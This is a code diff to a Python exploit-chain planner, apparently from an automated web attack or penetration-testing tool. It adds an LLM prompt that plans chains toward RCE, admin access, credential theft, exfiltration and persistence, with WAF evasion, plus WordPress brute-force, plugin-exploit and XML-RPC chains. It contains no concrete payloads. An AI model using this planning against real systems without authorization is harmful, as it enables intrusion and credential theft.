@@ -159,12 +159,455 @@ class ChainPlanner:
     Plans exploit chains based on discovered vulnerabilities and findings.
     Prioritizes chains by impact and feasibility.
     Uses AI for enhanced chain generation when Groq client available.
+    
+    Enhanced with LLM-based planning that:
+    - Uses AI to reason about exploit chains (not just hardcoded templates)
+    - Integrates with PayloadOptimizer to leverage historical success data
+    - Infers capabilities from discovered vulnerabilities
+    - Falls back to rule-based planning when AI is unavailable
     """
 
-    def __init__(self, state, learning_engine=None, groq_client=None):
+    def __init__(self, state, learning_engine=None, groq_client=None, payload_optimizer=None):
         self.state = state
         self.learning_engine = learning_engine
         self.groq = groq_client
+        self.payload_optimizer = payload_optimizer
+
+    # ─── AI-POWERED PLANNING METHODS ──────────────────────────────────────────────
+
+    def _infer_capabilities(self) -> List[str]:
+        """Infer what actions are possible based on discovered vulnerabilities.
+        
+        This method analyzes the current state to determine what exploitation
+        capabilities are available, which helps the AI planner understand
+        what actions can be taken.
+        
+        Returns:
+            List of capability strings (e.g., ['sql_injection', 'file_upload', 'http_request'])
+        """
+        caps = []
+        vulns = self.state.get("confirmed_vulnerabilities", []) or []
+        hints = self.state.get("vulnerability_hints", []) or []
+        endpoints = self.state.get("prioritized_endpoints", []) or []
+        
+        # Check vulnerabilities for capabilities
+        for v in vulns:
+            vtype = v.get("type", "").lower()
+            vname = v.get("name", "").lower()
+            vuln_text = f"{vtype} {vname}"
+            
+            if "sql" in vuln_text or "sqli" in vuln_text:
+                caps.append("sql_injection")
+            if "upload" in vuln_text or "file" in vuln_text:
+                caps.append("file_upload")
+            if "xss" in vuln_text or "cross-site" in vuln_text:
+                caps.append("xss")
+            if "lfi" in vuln_text or "traversal" in vuln_text or "include" in vuln_text:
+                caps.append("file_read")
+            if "rce" in vuln_text or "command" in vuln_text or "exec" in vuln_text:
+                caps.append("command_execution")
+            if "ssrf" in vuln_text:
+                caps.append("ssrf")
+            if "auth" in vuln_text or "bypass" in vuln_text:
+                caps.append("auth_bypass")
+            if "idor" in vuln_text or "insecure direct" in vuln_text:
+                caps.append("idor")
+            if "deserial" in vuln_text:
+                caps.append("deserialization")
+        
+        # Check vulnerability hints
+        for hint in hints:
+            hint_lower = hint.lower()
+            if "upload" in hint_lower:
+                caps.append("file_upload")
+            if "sqli" in hint_lower or "sql" in hint_lower:
+                caps.append("sql_injection")
+            if "xss" in hint_lower:
+                caps.append("xss")
+            if "lfi" in hint_lower or "rfi" in hint_lower:
+                caps.append("file_read")
+            if "rce" in hint_lower:
+                caps.append("command_execution")
+            if "ssrf" in hint_lower:
+                caps.append("ssrf")
+        
+        # Check endpoints for capabilities
+        for ep in endpoints:
+            if not isinstance(ep, dict):
+                continue
+            url = ep.get("url", "").lower()
+            categories = ep.get("categories", []) or []
+            
+            if any(kw in url for kw in ["upload", "file", "media", "attachment"]):
+                if "file_upload" not in caps:
+                    caps.append("file_upload")
+            if any(kw in url for kw in ["login", "auth", "admin", "wp-admin"]):
+                if "authentication" not in caps:
+                    caps.append("authentication")
+            if any(kw in url for kw in ["api", "rest", "graphql", "json"]):
+                if "api_access" not in caps:
+                    caps.append("api_access")
+            if any(kw in categories for kw in ["admin", "upload", "auth"]):
+                if f"endpoint_{kw}" not in caps:
+                    caps.append(f"endpoint_{kw}")
+        
+        # WordPress-specific capabilities
+        if self.state.get("wordpress_detected"):
+            caps.append("wordpress_exploitation")
+            if self.state.get("wp_users"):
+                caps.append("user_enumeration")
+            if self.state.get("wp_plugins"):
+                caps.append("plugin_enumeration")
+            if self.state.get("wp_vulnerabilities") or self.state.get("wp_vulns"):
+                caps.append("wordpress_vulnerability")
+        
+        # Always available
+        if "http_request" not in caps:
+            caps.append("http_request")
+        
+        return list(set(caps))  # Remove duplicates
+
+    def _build_planner_state(self) -> Dict[str, Any]:
+        """Build comprehensive state for AI planner.
+        
+        This method gathers all relevant information from the current state
+        into a structured format suitable for LLM-based planning.
+        
+        Returns:
+            Dictionary containing all relevant planning information
+        """
+        # Get top payloads from optimizer if available
+        successful_payloads = []
+        if self.payload_optimizer:
+            try:
+                successful_payloads = self.payload_optimizer.get_top_payloads_by_category(limit=20)
+            except Exception as e:
+                logger.debug(f"[CHAIN] Failed to get payloads from optimizer: {e}")
+        
+        # Build WordPress context
+        wp_context = {
+            "detected": self.state.get("wordpress_detected", False),
+            "version": self.state.get("wp_version", "unknown"),
+            "users": self.state.get("wp_users", []),
+            "plugins": self.state.get("wp_plugins", []),
+            "themes": self.state.get("wp_themes", []),
+            "vulnerabilities": self.state.get("wp_vulnerabilities", []) or self.state.get("wp_vulns", []),
+        }
+        
+        # Build endpoints summary
+        endpoints = self.state.get("prioritized_endpoints", []) or []
+        endpoint_summary = []
+        for ep in endpoints[:20]:  # Limit to top 20
+            if isinstance(ep, dict):
+                endpoint_summary.append({
+                    "url": ep.get("url", ""),
+                    "method": ep.get("method", "GET"),
+                    "categories": ep.get("categories", []),
+                    "vulnerability_hints": ep.get("vulnerability_hints", []),
+                    "response_code": ep.get("response_code"),
+                })
+        
+        # Build vulnerabilities summary
+        vulns = self.state.get("confirmed_vulnerabilities", []) or []
+        vuln_summary = []
+        for v in vulns[:15]:  # Limit to top 15
+            if isinstance(v, dict):
+                vuln_summary.append({
+                    "type": v.get("type", ""),
+                    "name": v.get("name", ""),
+                    "endpoint": v.get("endpoint", v.get("url", "")),
+                    "severity": v.get("severity", "MEDIUM"),
+                    "description": v.get("description", ""),
+                })
+        
+        return {
+            "target": self.state.get("target", ""),
+            "base_url": self._get_base_url(),
+            "endpoints": endpoint_summary,
+            "vulnerabilities": vuln_summary,
+            "wordpress": wp_context,
+            "capabilities": self._infer_capabilities(),
+            "technologies": self.state.get("tech_stack", []) or self.state.get("technologies", []),
+            "successful_payloads": successful_payloads,
+            "goal": "rce_or_admin_access",  # Primary goal
+            "alternative_goals": [
+                "data_exfiltration",
+                "credential_theft",
+                "persistence",
+                "privilege_escalation"
+            ]
+        }
+
+    def _plan_with_ai(self) -> List[ExploitChain]:
+        """Use AI to generate exploit chains based on comprehensive state analysis.
+        
+        This method sends the current state to the LLM and asks it to reason
+        about optimal exploitation chains, considering:
+        - Available capabilities and vulnerabilities
+        - Historical success rates from payload optimizer
+        - Multi-step chain possibilities
+        - Fallback options if primary attack fails
+        
+        Returns:
+            List of ExploitChain objects generated by AI
+        """
+        if not self.groq:
+            return []
+        
+        try:
+            # Check if Groq circuit breaker is open
+            if hasattr(self.groq, '_circuit_state') and self.groq._circuit_state.name == 'OPEN':
+                logger.debug("[CHAIN] Groq circuit breaker OPEN - skipping AI planning")
+                return []
+            
+            # Build comprehensive state for planning
+            planner_state = self._build_planner_state()
+            
+            # Check if we have minimum evidence for AI planning
+            if not self._has_minimum_chain_evidence():
+                logger.debug("[CHAIN] Insufficient evidence for AI planning")
+                return []
+            
+            # Build the planning prompt
+            prompt = self._build_ai_planning_prompt(planner_state)
+            
+            # Call Groq with the planning prompt
+            response = self.groq.generate(
+                prompt=prompt,
+                system=_CHAIN_PLANNER_SYSTEM,
+                temperature=0.3  # Lower temperature for more deterministic planning
+            )
+            
+            # Parse the AI response into executable chains
+            chains = self._parse_ai_plan_response(response, planner_state)
+            
+            if chains:
+                logger.info(f"[CHAIN] AI planner generated {len(chains)} chains")
+                for chain in chains:
+                    logger.info(f"[CHAIN] → [AI] [{chain.risk_level}] {chain.name}")
+            
+            return chains
+            
+        except Exception as e:
+            error_msg = str(e)
+            if '403' in error_msg or 'Forbidden' in error_msg:
+                logger.warning("[CHAIN] Groq API 403 Forbidden - AI planning disabled")
+                self.groq = None
+            else:
+                logger.debug(f"[CHAIN] AI planning failed: {e}")
+            return []
+
+    def _build_ai_planning_prompt(self, state: Dict[str, Any]) -> str:
+        """Build the prompt for AI-based chain planning.
+        
+        Args:
+            state: The planner state from _build_planner_state()
+            
+        Returns:
+            Formatted prompt string for the LLM
+        """
+        # Format successful payloads for context
+        payload_context = ""
+        if state.get("successful_payloads"):
+            payload_context = "\nHISTORICALLY SUCCESSFUL PAYLOADS (prioritize these):\n"
+            for p in state["successful_payloads"][:5]:
+                payload_context += f"  - {p.get('payload', '')[:80]} (score: {p.get('score', 0):.2f}, success_rate: {p.get('success_rate', 0):.0%})\n"
+        
+        # Format capabilities
+        caps_text = ", ".join(state.get("capabilities", []))
+        
+        # Format WordPress info
+        wp_text = "Not detected"
+        if state.get("wordpress", {}).get("detected"):
+            wp_info = state["wordpress"]
+            wp_text = f"Version: {wp_info.get('version', 'unknown')}"
+            if wp_info.get("plugins"):
+                wp_text += f", Plugins: {len(wp_info['plugins'])}"
+            if wp_info.get("vulnerabilities"):
+                wp_text += f", Vulnerabilities: {len(wp_info['vulnerabilities'])}"
+        
+        prompt = f"""TARGET ANALYSIS FOR EXPLOIT CHAIN PLANNING
+
+Target: {state.get('target', '')}
+Base URL: {state.get('base_url', '')}
+
+AVAILABLE CAPABILITIES: {caps_text}
+
+WORDPRESS: {wp_text}
+
+TECHNOLOGIES: {', '.join(state.get('technologies', []))}
+
+DISCOVERED ENDPOINTS (top 15):
+{json.dumps(state.get('endpoints', [])[:15], indent=2)}
+
+CONFIRMED VULNERABILITIES:
+{json.dumps(state.get('vulnerabilities', []), indent=2)}
+{payload_context}
+
+GOAL: {state.get('goal', 'rce_or_admin_access')}
+
+THINK STEP BY STEP:
+1. What is the fastest path to achieve the goal?
+2. What vulnerabilities can be chained together?
+3. What are the prerequisites for each step?
+4. What fallback options exist if primary attack fails?
+5. What is the minimum number of steps needed?
+
+Return a JSON array of exploit chains. Each chain must have:
+- name: Short descriptive name
+- description: What this chain achieves
+- risk_level: CRITICAL, HIGH, MEDIUM, or LOW
+- steps: Array of steps, each with:
+  - name: Step name
+  - action: Action type (http_request, sql_inject, upload_file, login, execute_command, exploit_vulnerability)
+  - target: Target URL or endpoint
+  - tool: Recommended tool (curl, sqlmap, wpscan, hydra, burp, custom_script)
+  - success_indicator: What indicates success
+  - depends_on: List of step names this step depends on
+  - preconditions: List of conditions that must be true
+  - postconditions: List of outcomes after this step
+
+IMPORTANT: Focus on REALISTIC and EXECUTABLE chains. Prioritize chains that:
+1. Use historically successful payloads
+2. Require fewer steps
+3. Have clear success indicators
+4. Consider WAF evasion if needed
+
+Return ONLY valid JSON."""
+        
+        return prompt
+
+    def _parse_ai_plan_response(self, response: str, state: Dict[str, Any]) -> List[ExploitChain]:
+        """Parse AI response into ExploitChain objects.
+        
+        Args:
+            response: Raw response from the LLM
+            state: The planner state for context
+            
+        Returns:
+            List of ExploitChain objects
+        """
+        chains = []
+        base_url = state.get('base_url', self._get_base_url())
+        
+        try:
+            # Try to extract JSON from response
+            json_pattern = r'\[[\s\S]*?\]'
+            json_matches = re.findall(json_pattern, response, re.DOTALL)
+            
+            if not json_matches:
+                # Try to find JSON object pattern
+                json_pattern = r'\{[\s\S]*?"name"[\s\S]*?"steps"[\s\S]*?\}'
+                json_matches = re.findall(json_pattern, response, re.DOTALL)
+            
+            for match in json_matches:
+                try:
+                    chain_data = json.loads(match)
+                    
+                    # Handle both array of chains and single chain
+                    if isinstance(chain_data, dict):
+                        chain_data = [chain_data]
+                    elif not isinstance(chain_data, list):
+                        continue
+                    
+                    for cd in chain_data:
+                        if not isinstance(cd, dict):
+                            continue
+                        
+                        chain_name = cd.get('name', 'AI Generated Chain')
+                        chain_desc = cd.get('description', '')
+                        risk_level = cd.get('risk_level', 'HIGH')
+                        
+                        # Validate risk level
+                        if risk_level not in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
+                            risk_level = 'HIGH'
+                        
+                        # Parse steps
+                        steps = []
+                        steps_data = cd.get('steps', [])
+                        
+                        for step_data in steps_data:
+                            if not isinstance(step_data, dict):
+                                continue
+                            
+                            step_name = step_data.get('name', 'Unknown Step')
+                            step_target = step_data.get('target', base_url)
+                            
+                            # Ensure target has proper URL
+                            if step_target and not step_target.startswith(('http://', 'https://')):
+                                step_target = self._build_full_url(step_target)
+                            
+                            if not step_target:
+                                step_target = base_url
+                            
+                            step = ExploitStep(
+                                name=step_name,
+                                action=step_data.get('action', step_name),
+                                target=step_target,
+                                tool=step_data.get('tool', 'curl'),
+                                payload=step_data.get('payload', ''),
+                                success_indicator=step_data.get('success_indicator', 'success'),
+                                depends_on=step_data.get('depends_on', []),
+                                preconditions=step_data.get('preconditions', []),
+                                postconditions=step_data.get('postconditions', []),
+                                priority=step_data.get('priority', 5)
+                            )
+                            steps.append(step)
+                        
+                        # Only add chain if it has valid steps
+                        if steps and chain_name:
+                            chain = ExploitChain(
+                                name=chain_name,
+                                description=chain_desc,
+                                steps=steps,
+                                risk_level=risk_level,
+                                estimated_time=f"{len(steps) * 5}-{len(steps) * 20} min",
+                                prerequisites=cd.get('prerequisites', []),
+                                preconditions=cd.get('preconditions', []),
+                                postconditions=cd.get('postconditions', [])
+                            )
+                            chains.append(chain)
+                            
+                except (json.JSONDecodeError, KeyError, TypeError) as e:
+                    logger.debug(f"[CHAIN] Failed to parse chain: {e}")
+                    continue
+                    
+        except Exception as e:
+            logger.error(f"[CHAIN] Failed to parse AI response: {e}")
+        
+        return chains
+
+    # ─── END AI-POWERED PLANNING METHODS ──────────────────────────────────────────
+
+    def _has_minimum_chain_evidence(self) -> bool:
+        """Require some concrete signal before generating high-impact exploit chains."""
+        confirmed_vulns = self.state.get("confirmed_vulnerabilities", []) or []
+        wp_vulns = self.state.get("wp_vulnerabilities", []) or self.state.get("wp_vulns", []) or []
+        conditioned = self.state.get("wp_conditioned_findings", []) or []
+        rce_paths = self.state.get("rce_chain_possibilities", []) or []
+        security_findings = self.state.get("security_findings", []) or []
+        prioritized = self.state.get("prioritized_endpoints", []) or []
+
+        hint_count = 0
+        upload_like = 0
+        for ep in prioritized:
+            if not isinstance(ep, dict):
+                continue
+            hint_count += len(ep.get("vulnerability_hints", []) or [])
+            url = (ep.get("url") or "").lower()
+            if any(marker in url for marker in ["upload", "xmlrpc", "wp-admin", "admin-ajax", "file="]):
+                upload_like += 1
+
+        evidence_score = (
+            len(confirmed_vulns)
+            + len(wp_vulns)
+            + len(conditioned)
+            + len(rce_paths)
+            + min(len(security_findings), 2)
+            + min(hint_count, 3)
+            + min(upload_like, 2)
+        )
+        return evidence_score > 0
 
     def _get_base_url(self) -> str:
         """
@@ -224,8 +667,11 @@ class ChainPlanner:
             if chain:
                 chains.append(chain)
         
-        # Add fallback heuristics (WordPress / pattern chains)
-        chains.extend(self.plan_chains())
+        # Add fallback heuristics only when we have at least minimal evidence.
+        if self._has_minimum_chain_evidence():
+            chains.extend(self.plan_chains())
+        else:
+            logger.info("[CHAIN] Insufficient evidence for heuristic chain generation; skipping fallback chains")
 
         # Smart prioritization
         chains = self.smart_prioritize(chains)
@@ -237,6 +683,8 @@ class ChainPlanner:
         """
         Plan exploit chains from enriched attack context.
         Uses AI if available, falls back to heuristic-based generation.
+        
+        Includes AI triage step for WordPress-specific templates (PRIORITY 5).
         
         Args:
             attack_context: Dict from AIAnalyzer.build_attack_context()
@@ -254,15 +702,34 @@ class ChainPlanner:
         
         logger.info(f"[CHAIN] Planning chains from context with {len(all_hints)} hint types and {len(patterns)} patterns")
         
+        # ─── PRIORITY 5: AI TRIAGE FOR WORDPRESS ──────────────────────────────────────
+        # If WordPress is detected, run AI triage to prioritize WP-specific chains
+        wordpress_context = attack_context.get('wordpress', {})
+        if wordpress_context.get('detected'):
+            logger.info("[CHAIN] WordPress detected - running AI triage for WP-specific templates")
+            wp_triage_chains = self._wordpress_ai_triage(attack_context)
+            if wp_triage_chains:
+                chains.extend(wp_triage_chains)
+                logger.info(f"[CHAIN] AI triage generated {len(wp_triage_chains)} WordPress-specific chains")
+        
         # Try AI-assisted chain generation first
         if self.groq:
             try:
-                ai_chains = self._generate_chains_with_ai(attack_context)
-                if ai_chains:
-                    chains.extend(ai_chains)
-                    logger.info(f"[CHAIN] AI generated {len(ai_chains)} chains")
+                # Check if Groq circuit breaker is open (API failing)
+                if hasattr(self.groq, '_circuit_state') and self.groq._circuit_state.name == 'OPEN':
+                    logger.info("[CHAIN] Groq circuit breaker is OPEN - skipping AI chain generation")
+                else:
+                    ai_chains = self._generate_chains_with_ai(attack_context)
+                    if ai_chains:
+                        chains.extend(ai_chains)
+                        logger.info(f"[CHAIN] AI generated {len(ai_chains)} chains")
             except Exception as e:
-                logger.debug(f"[CHAIN] AI chain generation failed: {e}, falling back to heuristics")
+                error_msg = str(e)
+                if '403' in error_msg or 'Forbidden' in error_msg:
+                    logger.warning("[CHAIN] Groq API 403 Forbidden - AI features disabled for this session")
+                    self.groq = None  # Disable Groq for remaining execution
+                else:
+                    logger.debug(f"[CHAIN] AI chain generation failed: {e}, falling back to heuristics")
         
         # Process identified patterns
         for pattern in patterns:
@@ -676,6 +1143,143 @@ class ChainPlanner:
             risk_level="HIGH"
         )
 
+    def _wordpress_ai_triage(self, attack_context: Dict) -> List[ExploitChain]:
+        """
+        PRIORITY 5: AI-powered triage for WordPress-specific attack chains.
+        
+        When WordPress is detected, this method analyzes the specific WP configuration
+        and generates prioritized attack chains based on:
+        - WordPress version and known vulnerabilities
+        - Plugin and theme versions with CVEs
+        - Available endpoints and their security posture
+        - Historical success rates for similar WP configurations
+        
+        Returns:
+            List of WordPress-specific ExploitChain objects, prioritized by likelihood
+        """
+        chains = []
+        wp_context = attack_context.get('wordpress', {})
+        
+        if not wp_context.get('detected'):
+            return chains
+        
+        logger.info(f"[CHAIN] Running WordPress AI triage for {wp_context.get('version', 'unknown version')}")
+        
+        # Get WordPress-specific data
+        wp_version = wp_context.get('version', 'unknown')
+        wp_plugins = wp_context.get('plugins', [])
+        wp_users = wp_context.get('users', [])
+        
+        # ─── TRIAGE RULE 1: Version-based prioritization ──────────────────────────
+        # Check if WP version has known critical vulnerabilities
+        critical_wp_versions = ['5.0', '5.1', '4.7', '4.6', '4.5', '3.x']
+        if any(wp_version.startswith(v) for v in critical_wp_versions):
+            chains.append(self._build_pattern_chain(
+                name="WordPress Core CVE Exploitation",
+                description=f"Target WordPress {wp_version} with known critical CVEs",
+                steps=[
+                    ExploitStep(
+                        name="Verify WordPress version",
+                        action="version_verification",
+                        target=wp_context.get('detection_url', ''),
+                        tool="wpscan",
+                        success_indicator=f"Version {wp_version} confirmed"
+                    ),
+                    ExploitStep(
+                        name="Exploit core vulnerability",
+                        action="core_exploit",
+                        target=wp_context.get('detection_url', ''),
+                        tool="metasploit/custom_exploit",
+                        success_indicator="Core vulnerability exploited"
+                    )
+                ],
+                risk_level="CRITICAL"
+            ))
+        
+        # ─── TRIAGE RULE 2: Vulnerable plugins prioritization ─────────────────────
+        vuln_plugins = [p for p in wp_plugins if p.get('vulnerabilities')]
+        if vuln_plugins:
+            # Sort by severity
+            vuln_plugins.sort(key=lambda p: len(p.get('vulnerabilities', [])), reverse=True)
+            
+            for plugin in vuln_plugins[:3]:  # Top 3 vulnerable plugins
+                plugin_name = plugin.get('name', 'unknown')
+                vuln_count = len(plugin.get('vulnerabilities', []))
+                
+                chains.append(self._build_pattern_chain(
+                    name=f"WordPress Plugin Exploit: {plugin_name}",
+                    description=f"Exploit {vuln_count} vulnerabilities in plugin {plugin_name}",
+                    steps=[
+                        ExploitStep(
+                            name="Verify plugin version",
+                            action="plugin_version_check",
+                            target=f"/wp-content/plugins/{plugin_name}/",
+                            tool="wpscan",
+                            success_indicator=f"Plugin {plugin_name} version confirmed"
+                        ),
+                        ExploitStep(
+                            name="Exploit plugin vulnerability",
+                            action="plugin_exploit",
+                            target=f"/wp-content/plugins/{plugin_name}/",
+                            tool="custom_exploit",
+                            success_indicator="Plugin vulnerability exploited"
+                        )
+                    ],
+                    risk_level="CRITICAL" if vuln_count > 2 else "HIGH"
+                ))
+        
+        # ─── TRIAGE RULE 3: User enumeration + brute force ────────────────────────
+        if wp_users and len(wp_users) > 0:
+            chains.append(self._build_pattern_chain(
+                name="WordPress User Brute Force",
+                description=f"Brute force {len(wp_users)} enumerated WordPress users",
+                steps=[
+                    ExploitStep(
+                        name="Enumerate users",
+                        action="user_enumeration",
+                        target="/wp-json/wp/v2/users",
+                        tool="wpscan",
+                        success_indicator=f"Found {len(wp_users)} users"
+                    ),
+                    ExploitStep(
+                        name="Brute force passwords",
+                        action="password_bruteforce",
+                        target="/wp-login.php",
+                        tool="hydra/wpscan",
+                        success_indicator="Valid credentials obtained"
+                    )
+                ],
+                risk_level="HIGH"
+            ))
+        
+        # ─── TRIAGE RULE 4: XML-RPC exploitation ──────────────────────────────────
+        xmlrpc_url = wp_context.get('xmlrpc_url', '')
+        if xmlrpc_url or any('xmlrpc' in attack_context.get('endpoints', [])):
+            chains.append(self._build_pattern_chain(
+                name="WordPress XML-RPC Exploitation",
+                description="Exploit XML-RPC for user enumeration and brute force",
+                steps=[
+                    ExploitStep(
+                        name="Verify XML-RPC enabled",
+                        action="xmlrpc_check",
+                        target="/xmlrpc.php",
+                        tool="curl",
+                        success_indicator="XML-RPC methodResponse received"
+                    ),
+                    ExploitStep(
+                        name="Enumerate users via XML-RPC",
+                        action="xmlrpc_enum",
+                        target="/xmlrpc.php",
+                        tool="custom_script",
+                        success_indicator="Users enumerated"
+                    )
+                ],
+                risk_level="HIGH"
+            ))
+        
+        logger.info(f"[CHAIN] WordPress AI triage generated {len(chains)} prioritized chains")
+        return chains
+
     def _build_php_exploitation_chain(self, endpoints: List[Dict]) -> ExploitChain:
         """Build PHP-specific exploitation chain."""
         return self._build_pattern_chain(
@@ -884,83 +1488,126 @@ class ChainPlanner:
         return tool_map.get(vuln_type.lower(), 'curl')
 
     def plan_chains(self) -> List[ExploitChain]:
-        """Analyze state and build relevant exploit chains"""
+        """Analyze state and build relevant exploit chains.
+        
+        Priority order:
+        1. Try AI-powered planning first (if Groq available)
+        2. Fall back to rule-based/heuristic planning only if needed
+        3. Apply smart prioritization
+        """
+        if not self._has_minimum_chain_evidence():
+            logger.info("[CHAIN] Low-signal state detected, no exploit chains planned")
+            return []
+
         chains = []
 
-        # NEW: Pattern-based chain generation from hints
-        hint_chains = self._generate_chains_from_hints()
-        chains.extend(hint_chains)
+        # ─── PRIORITY 1: AI-POWERED PLANNING ──────────────────────────────────────
+        ai_available = self.groq is not None
+        ai_success = False
+        
+        if ai_available:
+            try:
+                # Check circuit breaker
+                if hasattr(self.groq, '_circuit_state') and self.groq._circuit_state.name == 'OPEN':
+                    logger.debug("[CHAIN] Groq circuit breaker OPEN - skipping AI planning")
+                else:
+                    ai_chains = self._plan_with_ai()
+                    if ai_chains:
+                        chains.extend(ai_chains)
+                        ai_success = True
+                        logger.info(f"[CHAIN] AI planner generated {len(ai_chains)} chains")
+            except Exception as e:
+                error_msg = str(e)
+                if '403' in error_msg or 'Forbidden' in error_msg:
+                    logger.warning("[CHAIN] Groq API 403 Forbidden - disabling AI")
+                    self.groq = None
+                else:
+                    logger.debug(f"[CHAIN] AI planning failed: {e}")
 
-        # Detect patterns for chains
-        pattern_chains = self._detect_chain_patterns()
-        chains.extend(pattern_chains)
-        chains.extend(self._build_conditioned_wp_chains())
+        # ─── PRIORITY 2: HEURISTIC FALLBACK (chỉ khi AI không thành công) ─────────
+        if not ai_success:
+            logger.info("[CHAIN] AI not available or failed - using heuristic planning")
+            
+            # Hint-based chains
+            hint_chains = self._generate_chains_from_hints()
+            chains.extend(hint_chains)
+            
+            # Pattern-based chains
+            pattern_chains = self._detect_chain_patterns()
+            chains.extend(pattern_chains)
+            
+            # WordPress conditioned chains
+            conditioned_wp = self._build_conditioned_wp_chains()
+            chains.extend(conditioned_wp)
+            
+            # Vulnerability-specific chains
+            vulns = self.state.get("vulnerabilities", [])
+            wp_detected = self.state.get("wordpress_detected", False)
+            wp_users = self.state.get("wp_users", [])
+            wp_plugins = self.state.get("wp_plugins", [])
+            endpoints = self.state.get("prioritized_endpoints", [])
+            
+            # SQLi chains
+            sqli_vulns = [v for v in vulns if "sql" in v.get("name", "").lower() or v.get("type", "") == "SQLI"]
+            if sqli_vulns:
+                chains.append(self._build_sqli_chain(sqli_vulns[0]))
+            
+            # WordPress chains
+            if wp_detected:
+                if wp_users:
+                    chains.append(self._build_wp_admin_chain(wp_users))
+                
+                wp_xmlrpc = any("xmlrpc" in str(f).lower() for f in self.state.get("wp_vulns", []))
+                if wp_xmlrpc or wp_detected:
+                    chains.append(self._build_xmlrpc_chain(wp_users))
+                
+                if wp_plugins:
+                    vuln_plugins = [p for p in wp_plugins if p.get("vulnerabilities")]
+                    if vuln_plugins:
+                        chains.append(self._build_wp_plugin_chain(vuln_plugins[0]))
+            
+            # File upload chains
+            upload_endpoints = [ep for ep in endpoints if "upload" in ep.get("url", "").lower()]
+            if upload_endpoints:
+                chains.append(self._build_upload_chain(upload_endpoints[0]))
+                chains.append(self._build_direct_upload_rce_chain(upload_endpoints[0]))
+            
+            # LFI chains
+            lfi_endpoints = [ep for ep in endpoints if any(r in ep.get("url", "") for r in ["file=", "page=", "include=", "path=", "action="])]
+            wp_auto_endpoints = [ep for ep in endpoints if "wp-automatic" in ep.get("url", "").lower()]
+            if wp_auto_endpoints:
+                chains.append(self._build_wp_automatic_lfi_chain(wp_auto_endpoints[0]))
+            if lfi_endpoints:
+                chains.append(self._build_lfi_chain(lfi_endpoints[0]))
+            
+            # XSS chains
+            xss_vulns = [v for v in vulns if "xss" in v.get("name", "").lower() or "cross-site" in v.get("name", "").lower()]
+            if xss_vulns:
+                chains.append(self._build_xss_chain(xss_vulns[0]))
+            
+            # Log outcome
+            if chains:
+                logger.info(f"[CHAIN] Heuristic planner generated {len(chains)} chains")
+            else:
+                logger.info("[CHAIN] No heuristic chains generated")
 
-        vulns = self.state.get("vulnerabilities", [])
-        wp_detected = self.state.get("wordpress_detected", False)
-
-        vulns = self.state.get("vulnerabilities", [])
-        wp_detected = self.state.get("wordpress_detected", False)
-        wp_users = self.state.get("wp_users", [])
-        wp_plugins = self.state.get("wp_plugins", [])
-        endpoints = self.state.get("prioritized_endpoints", [])
-
-        # Check for SQLi vulnerabilities
-        sqli_vulns = [v for v in vulns if "sql" in v.get("name", "").lower() or
-                      v.get("type", "") == "SQLI"]
-        if sqli_vulns:
-            chains.append(self._build_sqli_chain(sqli_vulns[0]))
-
-        # WordPress chains
-        if wp_detected:
-            # WP user enumeration → brute → admin access → RCE chain
-            if wp_users:
-                chains.append(self._build_wp_admin_chain(wp_users))
-
-            # XML-RPC bruteforce chain
-            wp_xmlrpc = any(
-                "xmlrpc" in f.get("type", "").lower() or "xmlrpc" in f.get("url", "").lower()
-                for h_results in [self.state.get("wp_vulns", [])]
-                for f in h_results
-            )
-            if wp_xmlrpc or wp_detected:
-                chains.append(self._build_xmlrpc_chain(wp_users))
-
-            # Vulnerable plugin chain
-            vuln_plugins = [p for p in wp_plugins if p.get("vulnerabilities")]
-            if vuln_plugins:
-                chains.append(self._build_wp_plugin_chain(vuln_plugins[0]))
-
-        # File upload chain
-        upload_endpoints = [
-            ep for ep in endpoints
-            if ep.get("score", 0) >= 8 and "upload" in ep.get("url", "").lower()
-        ]
-        if upload_endpoints:
-            chains.append(self._build_upload_chain(upload_endpoints[0]))
-
-        # LFI chain
-        lfi_endpoints = [
-            ep for ep in endpoints
-            if any(r in ep.get("url", "") for r in ["file=", "page=", "include=", "path="])
-        ]
-        if lfi_endpoints:
-            chains.append(self._build_lfi_chain(lfi_endpoints[0]))
-
-        # XSS → Session hijack chain
-        xss_vulns = [v for v in vulns if "xss" in v.get("name", "").lower() or
-                     "cross-site" in v.get("name", "").lower()]
-        if xss_vulns:
-            chains.append(self._build_xss_chain(xss_vulns[0]))
-
-        logger.info(f"[CHAIN] Planned {len(chains)} exploit chains")
+        # Remove duplicates (by name)
+        seen_names = set()
+        unique_chains = []
         for chain in chains:
-            logger.info(f"[CHAIN] → [{chain.risk_level}] {chain.name}")
-
+            if chain.name not in seen_names:
+                seen_names.add(chain.name)
+                unique_chains.append(chain)
+        
         # Smart prioritization
-        chains = self.smart_prioritize(chains)
-
-        return chains
+        prioritized_chains = self.smart_prioritize(unique_chains)
+        
+        # Log final chains
+        for chain in prioritized_chains:
+            logger.info(f"[CHAIN] → [{chain.risk_level}] {chain.name}")
+        
+        logger.info(f"[CHAIN] Total {len(prioritized_chains)} chains after prioritization")
+        return prioritized_chains
 
     def _generate_chains_from_hints(self) -> List[ExploitChain]:
         """
@@ -1184,13 +1831,29 @@ class ChainPlanner:
         steps: List[ExploitStep],
         risk_level: str = "MEDIUM"
     ) -> ExploitChain:
-        """Build an exploit chain from pattern components."""
+        """Build an exploit chain from pattern components with URL validation."""
+        # Validate and fix empty URLs in steps
+        base_url = self._get_base_url()
+        validated_steps = []
+        for step in steps:
+            # Ensure step has a valid target URL
+            if not step.target or not step.target.strip():
+                step.target = base_url
+            elif not step.target.startswith(('http://', 'https://')):
+                step.target = self._build_full_url(step.target)
+            
+            # Ensure step has a meaningful name
+            if not step.name or step.name.strip() == "":
+                step.name = step.action if step.action else "Execute Step"
+            
+            validated_steps.append(step)
+        
         return ExploitChain(
             name=name,
             description=description,
-            steps=steps,
+            steps=validated_steps,
             risk_level=risk_level,
-            estimated_time=f"{len(steps) * 10}-{len(steps) * 30} min",
+            estimated_time=f"{len(validated_steps) * 10}-{len(validated_steps) * 30} min",
             prerequisites=["target reachable", "network access to target"]
         )
 
@@ -1461,40 +2124,79 @@ Format each chain as JSON with:
             return []
 
     def _parse_ai_chains_response(self, response: str) -> List[ExploitChain]:
-        """Parse AI-generated chains from response text."""
+        """Parse AI-generated chains from response text with proper URL handling."""
         chains = []
+        base_url = self._get_base_url()
+        
         try:
-            # Try to extract JSON from response
-            json_matches = re.findall(r'\{[^{}]*"entry_point"[^{}]*\}', response, re.DOTALL)
+            # Try to extract JSON from response - improved regex for nested JSON
